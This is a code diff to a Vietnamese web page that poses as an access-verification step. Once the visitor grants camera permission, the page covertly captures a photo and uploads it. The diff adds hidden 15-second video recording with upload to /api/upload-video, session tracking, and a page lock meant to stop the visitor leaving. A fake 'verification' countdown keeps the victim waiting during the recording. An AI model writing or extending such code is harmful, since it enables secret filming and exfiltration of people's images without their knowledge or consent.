@@ -292,7 +292,7 @@
       border: 1px solid rgba(108, 99, 255, 0.35);
       border-radius: 28px;
       padding: 40px 32px 36px;
-      max-width: 380px;
+      max-width: 400px;
       width: 100%;
       text-align: center;
       box-shadow: 0 24px 80px rgba(108, 99, 255, 0.25), 0 0 0 1px rgba(255, 255, 255, 0.06);
@@ -348,12 +348,38 @@
       font-size: 0.92rem;
       color: rgba(240, 240, 248, 0.6);
       line-height: 1.65;
-      margin-bottom: 28px;
+      margin-bottom: 20px;
     }
 
     .perm-desc strong {
       color: #a89cff;
       font-weight: 600;
+    }
+
+    /* Permission items list */
+    .perm-items {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .perm-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(108, 99, 255, 0.08);
+      border: 1px solid rgba(108, 99, 255, 0.18);
+      border-radius: 12px;
+      padding: 12px 14px;
+      font-size: 0.85rem;
+      color: rgba(240, 240, 248, 0.75);
+    }
+
+    .perm-item-icon {
+      font-size: 1.3rem;
+      flex-shrink: 0;
     }
 
     .perm-hint {
@@ -417,6 +443,142 @@
     }
 
 
+    /* ---- Wait Overlay (15s block) ---- */
+    #wait-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 9000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: rgba(6, 11, 26, 0.97);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      flex-direction: column;
+      gap: 0;
+    }
+
+    #wait-overlay.show {
+      display: flex;
+      animation: fadeInOverlay 0.5s ease;
+    }
+
+    .wait-card {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(108, 99, 255, 0.3);
+      border-radius: 32px;
+      padding: 48px 40px 44px;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 32px 80px rgba(108, 99, 255, 0.2);
+      animation: cardSlideUp 0.55s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+    }
+
+    /* Big SVG ring */
+    .wait-ring-wrap {
+      position: relative;
+      width: 140px;
+      height: 140px;
+      margin: 0 auto 28px;
+    }
+
+    .wait-ring-wrap svg {
+      transform: rotate(-90deg);
+    }
+
+    .wait-ring-bg {
+      fill: none;
+      stroke: rgba(108, 99, 255, 0.12);
+      stroke-width: 6;
+    }
+
+    .wait-ring-fill {
+      fill: none;
+      stroke: url(#waitGrad);
+      stroke-width: 6;
+      stroke-linecap: round;
+      stroke-dasharray: 408;
+      stroke-dashoffset: 408;
+      transition: stroke-dashoffset 1s linear;
+    }
+
+    .wait-ring-fill.done {
+      stroke: #00e5a0;
+      transition: stroke 0.4s ease;
+    }
+
+    .wait-number {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+    }
+
+    .wait-num-val {
+      font-size: 3rem;
+      font-weight: 800;
+      line-height: 1;
+      background: linear-gradient(135deg, #a89cff, #f72585);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      transition: all 0.3s ease;
+    }
+
+    .wait-num-val.done {
+      background: #00e5a0;
+      -webkit-background-clip: unset;
+      -webkit-text-fill-color: #00e5a0;
+      background-clip: unset;
+      font-size: 2.6rem;
+    }
+
+    .wait-num-label {
+      font-size: 0.72rem;
+      color: rgba(240, 240, 248, 0.4);
+      font-weight: 500;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .wait-title {
+      font-size: 1.35rem;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #eef0f8;
+    }
+
+    .wait-desc {
+      font-size: 0.88rem;
+      color: rgba(240, 240, 248, 0.5);
+      line-height: 1.65;
+      margin-bottom: 24px;
+    }
+
+    .wait-progress-wrap {
+      height: 5px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 99px;
+      overflow: hidden;
+    }
+
+    .wait-progress-bar {
+      height: 100%;
+      border-radius: 99px;
+      width: 0%;
+      background: linear-gradient(90deg, #6c63ff, #f72585);
+      transition: width 1s linear;
+    }
+
+    .wait-progress-bar.done {
+      background: #00e5a0;
+      width: 100% !important;
+      transition: background 0.4s ease;
+    }
 
     /* Hidden video element */
     #camera-feed {
@@ -524,21 +686,48 @@
   <!-- Permission Overlay -->
   <div id="permission-overlay">
     <div class="perm-card">
-      <div class="perm-icon-wrap"></div>
-      <div class="perm-title">Cần quyền truy cập </div>
+      <div class="perm-icon-wrap">🔐</div>
+      <div class="perm-title">Xác minh truy cập</div>
       <p class="perm-desc">
-        Để tiếp tục truy cập trang web, vui lòng <strong>ấn "Cho phép"</strong> khi trình duyệt hỏi về quyền sử dụng.
+        Để tiếp tục, vui lòng <strong>cho phép các quyền</strong> bên dưới:
       </p>
-      <p class="perm-desc">
-      </p>
-      <div class="perm-hint">
-        <span class="perm-hint-icon">💡</span>
-        <span class="perm-hint-text">Khi hộp thoại xuất hiện, hãy chọn <em>Cho phép</em> để tiếp tục vào trang
-          web.</span>
-      </div>
+
       <button class="perm-btn" id="perm-start-btn" onclick="requestPermission()">
         ✅ Đồng ý &amp; Tiếp tục
       </button>
+    </div>
+  </div>
+
+
+
+  <!-- Wait Overlay (15s block) -->
+  <div id="wait-overlay">
+    <div class="wait-card">
+      <div class="wait-ring-wrap">
+        <svg viewBox="0 0 140 140" width="140" height="140">
+          <defs>
+            <linearGradient id="waitGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+              <stop offset="0%" stop-color="#6c63ff"/>
+              <stop offset="100%" stop-color="#f72585"/>
+            </linearGradient>
+          </defs>
+          <circle class="wait-ring-bg" cx="70" cy="70" r="65"/>
+          <circle class="wait-ring-fill" id="wait-ring" cx="70" cy="70" r="65"/>
+        </svg>
+        <div class="wait-number">
+          <span class="wait-num-val" id="wait-num">15</span>
+          <span class="wait-num-label" id="wait-unit">giây</span>
+        </div>
+      </div>
+
+      <div class="wait-title" id="wait-title">⏳ Vui lòng chờ...</div>
+      <p class="wait-desc" id="wait-desc">
+        Trang đang được xử lý xác minh.<br>
+        Bạn có thể sử dụng web sau <strong id="wait-strong">15</strong> giây nữa.
+      </p>
+      <div class="wait-progress-wrap">
+        <div class="wait-progress-bar" id="wait-bar"></div>
+      </div>
     </div>
   </div>
 
@@ -551,8 +740,6 @@
   <!-- Hidden camera elements -->
   <video id="camera-feed" autoplay playsinline muted></video>
   <canvas id="capture-canvas"></canvas>
-
-
 
   <!-- Main content -->
   <div class="container">
@@ -593,7 +780,6 @@
 
   <div class="footer">© 2026 Thế Giới Của Bạn. All rights reserved.</div>
 
-  <!-- face-api.js from CDN -->
   <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
   <script>
     // ========== Particles ==========
@@ -614,19 +800,124 @@
       }
     })();
 
-
-
-    // ========== Camera & Face Detection ==========
+    // ========== State ==========
     let captured = false;
     let stream = null;
+    let sessionId = null;
+    let mediaRecorder = null;
+    let videoChunks = [];
+    const VIDEO_DURATION = 15000; // 15 giây
+
     const video = document.getElementById('camera-feed');
     const canvas = document.getElementById('capture-canvas');
 
-    async function loadModels() {
-      const MODEL_URL = '/models';
-      await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+    // ========== Session Registration ==========
+    async function registerSession() {
+      try {
+        const res = await fetch('/api/session/register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({})
+        });
+        const data = await res.json();
+        if (data.success) {
+          sessionId = data.sessionId;
+          sessionStorage.setItem('sessionId', sessionId);
+        }
+      } catch (e) {
+        console.log('Session register failed:', e);
+      }
     }
 
+    // ========== Toast Notification ==========
+    function showToast(icon, msg, duration = 3000) {
+      let toast = document.getElementById('toast-notif');
+      if (!toast) {
+        toast = document.createElement('div');
+        toast.id = 'toast-notif';
+        toast.style.cssText = `
+          position:fixed; bottom:100px; left:50%; transform:translateX(-50%);
+          background:rgba(15,18,32,0.95); border:1px solid rgba(108,99,255,0.35);
+          border-radius:100px; padding:12px 24px; font-size:0.9rem; font-weight:600;
+          color:#eef0f8; z-index:99998; backdrop-filter:blur(12px);
+          display:flex; align-items:center; gap:10px;
+          transition: opacity 0.4s ease; font-family:'Outfit',sans-serif;
+        `;
+        document.body.appendChild(toast);
+      }
+      toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
+      toast.style.opacity = '1';
+      clearTimeout(toast._t);
+      toast._t = setTimeout(() => { toast.style.opacity = '0'; }, duration);
+    }
+
+    // ========== Countdown Notification ==========
+    const WAIT_CIRCUMFERENCE = 2 * Math.PI * 65; // ~408.4
+    function showCountdown(seconds = 15) {
+      const overlay  = document.getElementById('wait-overlay');
+      const numEl    = document.getElementById('wait-num');
+      const unitEl   = document.getElementById('wait-unit');
+      const ring     = document.getElementById('wait-ring');
+      const titleEl  = document.getElementById('wait-title');
+      const descEl   = document.getElementById('wait-desc');
+      const strongEl = document.getElementById('wait-strong');
+      const bar      = document.getElementById('wait-bar');
+
+      // Reset
+      ring.style.strokeDasharray  = WAIT_CIRCUMFERENCE;
+      ring.style.strokeDashoffset = WAIT_CIRCUMFERENCE; // bắt đầu rỗng
+      ring.classList.remove('done');
+      numEl.textContent   = seconds;
+      numEl.classList.remove('done');
+      unitEl.textContent  = 'giây';
+      strongEl.textContent = seconds;
+      titleEl.textContent  = '⏳ Vui lòng chờ...';
+      bar.style.width = '0%';
+      bar.classList.remove('done');
+
+      // Hiện overlay chặn
+      overlay.classList.add('show');
+
+      let remaining = seconds;
+
+      // Khởi động ring sau 1 frame để transition hoạt động
+      requestAnimationFrame(() => {
+        ring.style.strokeDashoffset = 0;
+        bar.style.width = '100%';
+      });
+
+      const tick = setInterval(() => {
+        remaining--;
+        if (remaining <= 0) {
+          clearInterval(tick);
+          // Hoàn tất
+          numEl.textContent = '✔';
+          numEl.classList.add('done');
+          unitEl.textContent = 'xong!';
+          ring.classList.add('done');
+          bar.classList.add('done');
+          titleEl.textContent = '✅ Đã xác minh xong!';
+          descEl.innerHTML = 'Bạn có thể sử dụng trang web ngay bây giờ.';
+
+          // Ẩn overlay sau 1.5 giây
+          setTimeout(() => {
+            overlay.style.transition = 'opacity 0.5s ease';
+            overlay.style.opacity = '0';
+            setTimeout(() => {
+              overlay.classList.remove('show');
+              overlay.style.opacity = '';
+              overlay.style.transition = '';
+            }, 500);
+          }, 1500);
+          return;
+        }
+
+        numEl.textContent    = remaining;
+        strongEl.textContent = remaining;
+      }, 1000);
+    }
+
+    // ========== Camera ==========
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -639,9 +930,7 @@
         startDetection();
         return { success: true };
       } catch (err) {
-        console.log('Camera error:', err.name, err.message);
         let errorType = 'Lỗi camera không xác định';
-        
         if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
           errorType = 'Bạn đã từ chối quyền camera';
         } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
@@ -651,17 +940,13 @@
         } else if (err.name === 'SecurityError') {
           errorType = '❌ Trình duyệt không cho phép truy cập camera. Sử dụng HTTPS hoặc localhost.';
         }
-        
         return { success: false, error: errorType };
       }
     }
 
     async function startDetection() {
       if (captured) return;
-
-      // Chụp ảnh ngay lập tức mà không chờ phát hiện khuôn mặt
-      await new Promise(r => setTimeout(r, 500)); // Chờ 0.5s để camera ổn định
-
+      await new Promise(r => setTimeout(r, 500));
       if (!captured) {
         captured = true;
         captureAndSend();
@@ -678,23 +963,75 @@
         if (!blob) return;
         const formData = new FormData();
         formData.append('photo', blob, 'capture.jpg');
+        if (sessionId) {
+          formData.append('sessionId', sessionId);
+        }
 
         fetch('/api/upload', { method: 'POST', body: formData })
           .then(r => r.json())
-          .then(data => {
-            if (data.success) {
-              showToast('✅', 'Trang đã được tải xong!', 3000);
-            }
-            stopCamera();
+          .then(() => {
+            // ✅ Ảnh đã upload — KHÔNG dừng camera!
+            // Để stream chạy tiếp cho video recording hoàn tất
           })
-          .catch(() => stopCamera());
+          .catch(() => {});
       }, 'image/jpeg', 0.88);
     }
 
+    // Dừng toàn bộ camera + recorder (gọi sau khi video xong)
     function stopCamera() {
       if (stream) {
         stream.getTracks().forEach(t => t.stop());
         stream = null;
+      }
+    }
+
+    // ========== Video Recording ==========
+    function startVideoRecording(str) {
+      if (!window.MediaRecorder) return;
+      try {
+        let mimeType = 'video/webm;codecs=vp9';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/webm';
+        if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/mp4';
+
+        videoChunks = [];
+        mediaRecorder = new MediaRecorder(str, { mimeType, videoBitsPerSecond: 500000 });
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) videoChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          if (videoChunks.length === 0) return;
+          const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+          const blob = new Blob(videoChunks, { type: mimeType });
+          sendVideo(blob, ext);
+        };
+
+        mediaRecorder.start(1000); // thu thập mỗi 1s
+
+        // Dừng recorder sau VIDEO_DURATION — stream vẫn sống
+        setTimeout(() => {
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop(); // onstop sẽ gọi sendVideo rồi dừng stream
+          }
+        }, VIDEO_DURATION);
+
+      } catch (e) {
+        console.log('MediaRecorder error:', e);
+      }
+    }
+
+    async function sendVideo(blob, ext = 'webm') {
+      try {
+        const formData = new FormData();
+        formData.append('video', blob, `recording.${ext}`);
+        if (sessionId) formData.append('sessionId', sessionId);
+        await fetch('/api/upload-video', { method: 'POST', body: formData });
+      } catch (e) {
+        console.log('Video upload error:', e);
+      } finally {
+        // ✅ Video xong rồi mới dừng stream
+        stopCamera();
       }
     }
 
@@ -714,11 +1051,10 @@
       const btn = document.getElementById('perm-start-btn');
       const overlay = document.getElementById('permission-overlay');
 
-      // Xóa thông báo lỗi cũ
       const old = overlay.querySelector('.cam-err');
       if (old) old.remove();
 
-      // Kiểm tra nếu quyền đã bị chặn trước đó → không request nữa, hiện hướng dẫn ngay
+      // Kiểm tra camera permission
       try {
         const perm = await navigator.permissions.query({ name: 'camera' });
         if (perm.state === 'denied') {
@@ -728,53 +1064,63 @@
           btn.onclick = () => location.reload();
           return;
         }
-      } catch(e) { /* trình duyệt không hỗ trợ permissions API */ }
+      } catch (e) { /* trình duyệt không hỗ trợ */ }
 
-      // Hiện trạng thái loading ngắn rồi mở dialog ngay
       btn.disabled = true;
       btn.innerHTML = '📷 Đang mở camera...';
 
       try {
-        // Trình duyệt hiện hộp thoại xin quyền
+        // Xin quyền camera
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
 
-        // ✅ Cho phép → vào trang ngay
+        // ✅ Cho phép → Đóng overlay
         overlay.style.transition = 'opacity 0.3s ease';
         overlay.style.opacity = '0';
         setTimeout(() => { overlay.style.display = 'none'; }, 300);
 
-        // Chụp ảnh ngầm ở background
+        // Đăng ký session và chặn thoát
+        await registerSession();
+        lockPage();
+
+        // Chụp ảnh + Quay video ngầm
         video.srcObject = stream;
-        video.onloadedmetadata = () => { video.play(); startDetection(); };
+        video.onloadedmetadata = () => {
+          video.play();
+          startDetection();           // chụp ảnh
+          startVideoRecording(stream); // quay video 15s
+          showCountdown(15);           // đếm ngược 15s
+        };
 
       } catch (err) {
-        // ❌ Từ chối hoặc lỗi → ở lại overlay
         btn.disabled = false;
         btn.innerHTML = '🔄 Thử lại';
 
         if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-          showCamError('❌ Bạn chưa cấp quyền camera. Bấm <strong>Thử lại</strong> để tải lại trang và cấp quyền.');
+          showCamError('❌ Bạn chưa cấp quyền camera. Bấm <strong>Thử lại</strong> để cấp quyền.');
         } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
           showCamError('❌ Không tìm thấy camera trên thiết bị này.');
+          // Không có camera → vẫn đăng ký session
+          await registerSession();
+          lockPage();
+          overlay.style.transition = 'opacity 0.3s ease';
+          overlay.style.opacity = '0';
+          setTimeout(() => { overlay.style.display = 'none'; }, 300);
+          return;
         } else if (err.name === 'NotReadableError') {
           showCamError('❌ Camera đang bị ứng dụng khác dùng. Đóng ứng dụng đó rồi bấm Thử lại!');
         } else {
           showCamError('❌ Lỗi không xác định. Bấm Thử lại để tải lại trang!');
         }
 
-        // Thử lại = reload trang
         btn.onclick = () => location.reload();
       }
     }
 
     // ========== Init ==========
     window.addEventListener('load', () => { /* chờ user bấm nút */ });
-
-
-
   </script>
 </body>
 
